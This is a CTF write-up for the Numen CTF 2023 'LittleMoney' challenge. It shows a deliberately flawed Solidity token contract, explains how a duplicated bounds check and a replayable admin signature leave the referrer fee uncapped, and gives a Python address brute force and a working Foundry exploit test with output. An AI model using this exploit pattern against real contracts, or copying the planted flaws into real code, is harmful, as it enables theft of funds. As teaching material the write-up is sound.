# Numen CTF 2023 : LittleMoney

### Contract code :
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract PrivilegeFinance { 
    
	string public name = "Privilege Finance";
	string public symbol = "PF";
	uint256 public decimals = 18;
	uint256 public totalSupply = 200000000000;
    mapping(address => uint) public balances;
    mapping(address => address) public referrers;
    string msgsender = '0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E0';
    uint public rewmax = 65000000000000000000000;
    uint public time = 1677729607;
    uint public Timeinterval = 600;
    uint public Timewithdraw = 6000;
    uint public Timeintervallimit = block.timestamp;
    uint public Timewithdrawlimit = block.timestamp;
    bytes32 r = 0xf296e6b417ce70a933383191bea6018cb24fa79d22f7fb3364ee4f54010a472c;
    bytes32 s = 0x62bdb7aed9e2f82b2822ab41eb03e86a9536fcccff5ef6c1fbf1f6415bd872f9;
    uint8 v = 28;
    address public admin = 0x2922F8CE662ffbD46e8AE872C1F285cd4a23765b;
    uint public burnFees = 2;
    uint public ReferrerFees = 8;
    uint public transferRate = 10;
    address public BurnAddr = 0x000000000000000000000000000000000000dEaD;
	bool public flag;

	constructor() public {
	    balances[address(this)] = totalSupply;
	}

    function Airdrop() public {
        require(balances[msg.sender] == 0 && block.timestamp >= Timeintervallimit,"Collection time not reached");
        balances[msg.sender] += 1000;
        balances[address(this)] -= 1000;
        Timeintervallimit += Timeinterval;
    }

    function deposit(address token, uint256 amount, address _ReferrerAddress) public {
        require(amount > 0, "amount zero!");
        if (msg.sender != address(0) && _ReferrerAddress != address(0) && msg.sender != _ReferrerAddress && referrers[msg.sender] == address(0)) {
            referrers[msg.sender] = _ReferrerAddress;
        }
        balances[msg.sender] -= amount;
        balances[address(this)] += amount;
    }
  
    function withdraw(address token, uint256 amount) public {
        require(balances[msg.sender] == 0 && block.timestamp >= Timewithdrawlimit,"Collection time not reached");
        require(amount > 0 && amount <= 2000,"Financial restrictions");
        Timewithdrawlimit += Timewithdraw;
        require(amount > 0, "amount zero!");
        balances[msg.sender] += amount;
        balances[address(this)] -= amount;
    }

    function DynamicRew(address _msgsender,uint _blocktimestamp,uint _ReferrerFees,uint _transferRate) public returns(address) {
        require(_blocktimestamp < 1677729610, "Time mismatch");
        require(_transferRate <= 50 && _transferRate <= 50);
        bytes32 _hash = keccak256(abi.encodePacked(_msgsender, rewmax, _blocktimestamp));
        address a = ecrecover(_hash, v, r, s);
        require(a == admin && time < _blocktimestamp, "time or banker");
        ReferrerFees = _ReferrerFees;
        transferRate = _transferRate;
        return a;
    }

    function transfer(address recipient,uint256 amount) public {
        if(msg.sender == admin){
            uint256 _fee = amount * transferRate / 100;
            _transfer(msg.sender, referrers[msg.sender], _fee * ReferrerFees / transferRate);
            _transfer(msg.sender, BurnAddr, _fee * burnFees / transferRate);
            _transfer(address(this), recipient, amount * amount * transferRate);
            amount = amount - _fee;

        }else if(recipient == admin){
            uint256 _fee = amount * transferRate / 100;
            _transfer(address(this), referrers[msg.sender], _fee * ReferrerFees / transferRate);
            _transfer(msg.sender, BurnAddr, _fee * burnFees / transferRate);
            amount = amount - _fee;
        }
        _transfer(msg.sender, recipient, amount);
    }  

	function _transfer(address from, address _to, uint _value) internal returns (bool) {
	    balances[from] -= _value;
	    balances[_to] += _value;
	    return true;
	}

	function setflag() public {
	    if(balances[msg.sender] > 10000000){
			flag = true;
		}
	}

	function isSolved() public view returns(bool){
	    return flag;
    }

}
```

Our goal is to have a balance of more than 10000000 tokens

We can set `ReferrerFees` and `transferRate` in `DynamicRew()`, however it will check for a few things

`_blocktimestamp` need to be greater than 1677729607 and smaller than 1677729610, so it can either be 1677729608 or 1677729609

`_msgsender` is hashed with `rewmax` and `_blocktimestamp`, and it will hash them, and check if it equals to the signature signed by the admin, which is shown in the state variable

There's a `msgsender` state variable :
```
string msgsender = '0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E0';
```

However 2 least significant hex digits are missing, but is checksummed and there is just 256 possibilities, so we can just bruteforce it to see which address has the same checksum :
```python
from web3 import Web3

msgsender = "0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E0"

for i in range(256):
	hexDigits = "{:02x}".format(i)
	checksummed = Web3.toChecksumAddress(msgsender + hexDigits)
	if (checksummed[:-2] == msgsender):
		print(checksummed)
```

```
# python3 bruteForceChecksum.py 
0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E053
```

We will use this address as the `_msgsender` parameter, as there's no check that our address same as the `_msgsender` parameter

There's only 2 possibility for the `_blocktimestamp`, so we can just try it manually, and `1677729609` works

We can set `ReferrerFees` and `transferRate` to whatever we want, as long as `transferRate` <= 50, and it has no restriction on `ReferrerFees` :

```solidity
require(_transferRate <= 50 && _transferRate <= 50);
```

It checks `_transferRate` twice, I guess one should be `_ReferrerFees` instead, but it has a typo, and the typo allow us to set a large `ReferrerFees`

```
        }else if(recipient == admin){
            uint256 _fee = amount * transferRate / 100;
            _transfer(address(this), referrers[msg.sender], _fee * ReferrerFees / transferRate);
            _transfer(msg.sender, BurnAddr, _fee * burnFees / transferRate);
            amount = amount - _fee;
        }
        _transfer(msg.sender, recipient, amount);
```

In `transfer()`, if the recipient is admin, the `_fee` will be transferRate/100 of the amount, and the contract will transfer `_fee * ReferrerFees / transferRate` to our referrer

We can set another account we control as the referrer and set a really high `ReferrerFees`, so the referrer get a large amount of token from the contract

Then we can just use the referrer account that we control to call `setFlag()`

Also before calling `transfer()`, we have to call `Airdrop()` to get 1000 tokens first and deposit 1 token to set our referrer

### Foundry test :
```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.12;

import "forge-std/Test.sol";
import "../src/GOATFinance.sol";

contract goatFinanceTest is Test {
    PrivilegeFinance public goatFi;
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");
    address hacker2 = makeAddr("hacker2");

    function setUp() public {
        vm.prank(owner);
        goatFi = new PrivilegeFinance();
    }

    function testAttack() public {
        vm.startPrank(hacker);
        
        // get 1000 token to hacker from airdrop
        goatFi.Airdrop();
        
        console.log("Hacker balance :", goatFi.balances(hacker));
        console.log("Hacker2 balance :", goatFi.balances(hacker2));
        console.log("GOATFinance balance :", goatFi.balances(address(goatFi)));
        
        // set hacker's referrer to hacker2
        goatFi.deposit(address(0), 1, hacker2);
        goatFi.DynamicRew(0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E053, 1677729609, 1000000000, 50);
        // transfer to admin, so referrer get fee from goatFi contract
        goatFi.transfer(0x2922F8CE662ffbD46e8AE872C1F285cd4a23765b, 999);
        
        console.log("Hacker balance after :", goatFi.balances(hacker));
        console.log("Hacker2 balance after :", goatFi.balances(hacker2));
        console.log("GOATFinance balance after :", goatFi.balances(address(goatFi)));
        
        vm.stopPrank();
        vm.startPrank(hacker2);
        
        goatFi.setflag();
        
        assertTrue(goatFi.isSolved());
    }
}
```

```
# forge test --match-path test/GOATFinance.t.sol -vv
[⠆] Compiling...
No files changed, compilation skipped

Running 1 test for test/GOATFinance.t.sol:goatFinanceTest
[PASS] testAttack() (gas: 191636)
Logs:
  Hacker balance : 1000
  Hacker2 balance : 0
  GOATFinance balance : 199999999000
  Hacker balance after : 480
  Hacker2 balance after : 9980000000
  GOATFinance balance after : 190019999001

Test result: ok. 1 passed; 0 failed; finished in 1.51ms
```